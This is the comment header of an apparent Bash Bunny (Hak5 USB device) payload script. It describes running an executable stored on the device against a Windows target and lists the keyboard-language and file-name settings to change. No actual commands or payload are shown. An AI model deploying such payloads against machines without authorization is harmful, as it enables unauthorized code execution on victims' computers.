# Description:   Executes a binary executable from the Bunny storage
#                Inspired by payload scripts available on the Hak5 GitHub
#
#                Two things needs to be changed in the payload below, DUCKY_LANG and specifying the exe file on the RUN WIN line
#                The exe file of course needs to be located in the same switch directory as this payload
